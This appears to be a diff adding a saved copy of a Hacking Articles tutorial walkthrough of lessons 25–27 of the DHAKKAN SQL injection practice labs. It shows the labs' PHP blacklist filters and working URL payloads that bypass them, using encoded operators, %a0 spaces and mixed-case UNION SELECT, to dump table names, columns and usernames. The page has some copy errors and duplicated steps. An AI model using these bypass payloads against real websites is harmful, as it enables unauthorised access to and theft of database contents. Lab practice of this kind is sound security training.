@@ -1,0 +1,146 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">How to Bypass SQL Injection Filter  Manually</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/bypass-filter-sql-injection-manually/" rel="bookmark"><time class="entry-date published" datetime="2017-06-03T17:39:48+00:00">June 3, 2017</time><time class="updated" datetime="2025-05-24T13:07:27+00:00">May 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In <a style="color: #000000;" href="http://www.hackingarticles.in/beginner-guide-sql-injection-part-1/">the <strong>previous</strong></a> article you have learned the basic concepts of SQL injection but in some scenarios, you will find that your basic knowledge and tricks will fail. The reason behind that is the protection that developer had applied to prevent SQL injection, sometimes developer use filters to strip out few characters and OPERATORS from the user input before adding it to the query for SQL statement to prevent SQL Injection. Today’s article will help you to face such situations and will tell you how to bypass such filters. Here again, we’ll be using DHAKKAN SQLI labs for practice.</span></p>
+<p><span style="color: #000000;"><strong>Let’s start!!</strong></span></p>
+<h3><span style="color: #800000;">Lesson 25</span></h3>
+<p><span style="color: #000000;">In Lab 25 <strong>OR</strong> and <strong>AND</strong> <strong>function</strong> are <strong>Blocked</strong> here we will try to bypass sql filter using their substitute.</span></p>
+<p><span style="color: #000000;">function blacklist($id)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$id= preg_replace('/or/i',"", $id);                              //strip out OR (non case sensitive)
+$id= preg_replace('/AND/i',"", $id);                         //Strip out AND (non case sensitive)</pre>
+<p><span style="color: #000000;">Since alphabetic word OR, AND are blacklisted, hence if we use AND 1=1 and OR 1=1 there would be no output therefore I had use %26%26 inside the query.</span></p>
+<p><span style="color: #000000;"> Following are a replacement for AND and OR</span></p>
+<p><span style="color: #000000;"><strong>AND :</strong>   &amp;&amp;   %26%26 </span></p>
+<p><span style="color: #000000;"><strong>OR</strong>: || </span></p>
+<p><span style="color: #000000;">Open the browser and type following SQL query  in URL</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=1' %26%26 1=1 --+</pre>
+<p><span style="color: #000000;">From the screenshot, you can see we have successfully fixed the query for AND (&amp;&amp;) into URL encode as %26%26. Even when AND operator was filtered out.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-816L4cg3CZg/WTLu7AtpgcI/AAAAAAAAQKg/RUTcgLcEWpAk74uzCUTOUTGJwkqxvLRMQCLcB/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Once the concept is clear to bypass AND filter later we need to alter the  SQL statement for retrieving database information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=-1' union select 1,2,3 %26%26 1=1 --+</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-jeW65DIH8xA/WTLu-nA75ZI/AAAAAAAAQLA/88ZDU0X31J0C1Mk_R17RvzeguF-2t_mTACLcB/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Type following query to retrieve database name using union injection</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=-1' union select 1,database(),3 %26%26 1=1 --+</pre>
+<p><span style="color: #000000;"><strong> </strong>hence you can see we have successfully get <strong>security</strong> as database name as result.</span></p>
+<p><span style="color: #000000;"> <img decoding="async" src="https://4.bp.blogspot.com/-0pEDFxutsRU/WTLu_Te8M0I/AAAAAAAAQLE/GGy709szCFs9gAd8DCQ2hz0zofw7p6ItQCLcB/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Next query will provide entire table names saved inside the database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=-1' union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database() %26%26 1=1 --+</pre>
+<p><span style="color: #000000;">From the screenshot you can read the following table names:</span></p>
+<pre class="lang:default decode:true">T1: emails
+T2: referers
+T3: uagents
+T4: users</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fXB0-2T_Mac/WTLu_kONw0I/AAAAAAAAQLI/gvSB4aAjrlsRWLLu5YdImZnH9zPymgvZgCLcB/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Now we’ll try to find out column names of users table using the following query.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=-1' union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='users' %26%26 1=1 --+</pre>
+<p><span style="color: #000000;">Hence you can see it contains 4 columns inside it.</span></p>
+<pre class="lang:default decode:true">C1: id
+C2: username
+C3: password</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-RYFhUd1MS-g/WTLu_yVxzLI/AAAAAAAAQLM/iCncex7zv0oBtCwAuakkZTBPO0di0qHvACLcB/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">At last, execute the following query to read all username inside the table users from inside its column.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-25/?id=-1' union select 1,group_concat(username),3 from users --+</pre>
+<p><span style="color: #000000;">From the screenshot, you can read the fetched data.</span></p>
+<p><span style="color: #000000;">Hence in lesson 25, we have learned how to bypass AND, OR filter for retrieving information inside the database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Vlr_PRNEi3Y/WTLvAaTz2dI/AAAAAAAAQLQ/2qpInWr-vRshqAGo5ETSmoaycZtTN6xxgCLcB/s1600/6.png"/></span></p>
+<h3><span style="color: #800000;">Lesson 26</span></h3>
+<p><span style="color: #000000;">You will find lab 26 more challenging because here space, Comments, OR and AND are Blocked so now we will try to bypass SQL filter using their substitute.</span></p>
+<p><span style="color: #000000;">Following are function blacklist($id)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">preg_replace('/or/i',"", $id);                                       //strip out OR (non case sensitive)
+$id= preg_replace('/and/i',"", $id);                          //Strip out AND (non case sensitive)
+$id= preg_replace('/[\/\*]/',"", $id);                       //strip out /*
+$id= preg_replace('/[--]/',"", $id);                            //Strip out --
+$id= preg_replace('/[#]/',"", $id);                             //Strip out #
+$id= preg_replace('/[\s]/',"", $id);                            //Strip out spaces
+$id= preg_replace('/[\/\\\\]/',"", $id);    //Strip out slashes</pre>
+<p><span style="color: #000000;">This lab has more filters as compared to lab 25  because here space,Comments are also Blocked. Now execute following query In URL .</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=1'%a0%26%26'1=1</pre>
+<p><span style="color: #000000;">From screenshot you can see we have successfully fixed the query for SPACE into URL encode as %a0</span></p>
+<p><span style="color: #000000;">Blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’ ‘%a0’)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Jx4wl-Z7twI/WTLvBJkcf9I/AAAAAAAAQLU/W1abQk4vdQA9XE7zxNOu19-n-i4-I0hUQCLcB/s1600/7.1.png"/></span></p>
+<p><span style="color: #000000;">Once the concept is clear to bypass AND, OR and SPACE filter later we need to alter the SQL statement for retrieving database information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=0'%a0union%a0select%a01,2,3%a0%26%26'1=1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QwHCrxnipbM/WTLvBC0iimI/AAAAAAAAQLY/3hIq-CszsXwyZvkYlegNoXGcqiiAkVXggCLcB/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Type following query to retrieve database name using union injection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=0'%a0union%a0select%a01,database(),3%a0%26%26%'1=1</pre>
+<p><span style="color: #000000;">Hence you can see we have successfully get <strong>security</strong> as database name as a result</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-AYPqR54YMV0/WTLvBiQCc8I/AAAAAAAAQLc/aWqlYjKHMnwws9vHbfw8M8Q9KsUYxR5VgCLcB/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Next query will provide entire table names saved inside the database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=0'%a0union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%a0%26%26'1=1</pre>
+<p><span style="color: #000000;">From the screenshot you can read the following table names:</span></p>
+<pre class="lang:default decode:true">T1: emails
+T2: referers
+T3: uagents
+T4: users</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-rRo3lYNzFtc/WTLvCKIsEgI/AAAAAAAAQLg/6Y8oQ8yDDXwngMiDE8Xz0AiRF_q6Y06jwCLcB/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now we’ll try to find out column names of users table using the following query.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=0'%a0union%a0select%a01,group_concat(column_name),3%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users'%a0%26%26'1=1</pre>
+<p><span style="color: #000000;">Hence you can see columns inside it.</span></p>
+<pre class="lang:default decode:true">C1: id
+C2: username
+C3: password</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uXjnIbo6zTo/WTLu62ZAbpI/AAAAAAAAQKc/wVRHEEJUM58yhRA3ciwdsQkEqdEns02TACLcB/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">At last, execute the following query to read all username inside the table users from inside its column.</span></p>
+<p><span style="color: #000000;">From the screenshot, you can read the fetched data.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-26/?id=0'%a0union%a0select%a01,group_concat(username),3%a0from%a0users%a0where%a01%26%26%a0'1</pre>
+<p><span style="color: #000000;">Hence in lesson 26, we have learned how to bypass AND, OR, SPACE AND COMMENT filter for retrieving information from the database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XA1VeqprQ2I/WTLu7OY26DI/AAAAAAAAQKk/4WQFQLlcjwAJ7w-KvxAwkKkuL26XsypzQCLcB/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;">Lesson 27</span></h3>
+<p><span style="color: #000000;">You will find this lab even more challenging because here we block UNION/union, SELECT/select, SPACE, and Comments, so now we will try to bypass the SQL filter using their substitute.</span></p>
+<p><span style="color: #000000;">Following are function blacklist($id)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$id= preg_replace('/[\/\*]/',"", $id);                       //strip out /*
+$id= preg_replace('/[--]/',"", $id);                            //Strip out --.
+$id= preg_replace('/[#]/',"", $id);                   //Strip out #.
+$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+$id= preg_replace('/select/m',"", $id);       //Strip out spaces.
+$id= preg_replace('/[ +]/',"", $id);                //Strip out spaces.
+$id= preg_replace('/union/s',"", $id);         //Strip out union
+$id= preg_replace('/select/s',"", $id);         //Strip out select
+$id= preg_replace('/UNION/s',"", $id);      //Strip out UNION
+$id= preg_replace('/SELECT/s',"", $id);       //Strip out SELECT
+$id= preg_replace('/Union/s',"", $id);         //Strip out Union
+$id= preg_replace('/Select/s',"", $id);         //Strip out select</pre>
+<p><span style="color: #000000;">This lab has more filters in addtion to lab 26  because here union, select, space andComments are also Blocked. Now execute following query In URL .</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=1' AND'1=1</pre>
+<p><span style="color: #000000;">Once the concept is clear to bypass UNION/union, SELECT/select and SPACE filter later we need to alter the SQL statement for retrieving database information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=1'%a0UnIon%a0SeLect%a01,2,3%a0AND'1=1</pre>
+<p><span style="color: #000000;"> In the screenshot, you can see I have use union as UnIon and select as SeLect in the query to bypass the filter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sGMmr7uOfLQ/WTLu8bYO1BI/AAAAAAAAQKo/QGNBxy8UQBUP5s0Cj5YjKCwVxTgqZvHTQCLcB/s1600/12.1.png"/></span></p>
+<p><span style="color: #000000;">Once the concept is clear to bypass UNION/union, SELECT/select and SPACE filter later we need to alter the SQL statement for retrieving database information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=1'%a0UnIon%a0SeLect%a01,2,3%a0AND'1=1</pre>
+<p><span style="color: #000000;"> In the screenshot, you can see I have use union as UnIon and select as SeLect in the query to bypass the filter.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BriJa3vEoI4/WTLu8hcJApI/AAAAAAAAQKw/Upjbx--mUVM_jFi-T90Agv3SzKIY1IEKACLcB/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now Type the following query to retrieve database name using union injection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,database(),3%a0AND'1=1</pre>
+<p><span style="color: #000000;">Hence you can see we have successfully get <strong>security</strong> as a database name as a result</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BriJa3vEoI4/WTLu8hcJApI/AAAAAAAAQKw/Upjbx--mUVM_jFi-T90Agv3SzKIY1IEKACLcB/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Next query will provide entire table names saved inside the database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,group_concat(table_name),3%a0from%a0information_schema.tables%a0where%a0table_schema=database()%a0AND'1=1</pre>
+<p><span style="color: #000000;">From the screenshot you can read the following table names:</span></p>
+<pre class="lang:default decode:true">T1: emails
+T2: referers
+T3: uagents
+T4: users</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-GTqX-Am6_vE/WTLu9ic7kAI/AAAAAAAAQK0/BhcY7dEf3B40Ws-yAr0YGnrBSpV7R1HTgCLcB/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Now we’ll try to find out column names of users table using the following query.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81/sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0AND'1=1</pre>
+<p><span style="color: #000000;">Hence you can see columns inside it.</span></p>
+<pre class="lang:default decode:true">C1: id
+C2: username
+C3: password</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QzMbi3NOqP4/WTLu-HLUtaI/AAAAAAAAQK4/tFg1XvBGiHE6BtOPOGYn6CMfHh4mgwHgwCLcB/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">At last, execute the following query to read all username inside the table users from inside its column.</span></p>
+<p><span style="color: #000000;">From the screenshot, you can read the fetched data.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:81//sqli/Less-27/?id=0'%a0UnIon%a0SeLect%a01,group_concat(column_name),3%a0from%a0information_schema.columns%a0where%a0table_name='users'%a0AND'1=1</pre>
+<p><span style="color: #000000;">Hence in lesson 27, we have learned how to bypass UNION/union, SELECT/select, SPACE and COMMENT filter for retrieving information inside the database.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-n42edao9zdc/WTLu-H2gXFI/AAAAAAAAQK8/Cxpt6kQDqowkphQqqfThH8aAn7zB1nVFwCLcB/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">To learn more about Database Hacking. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
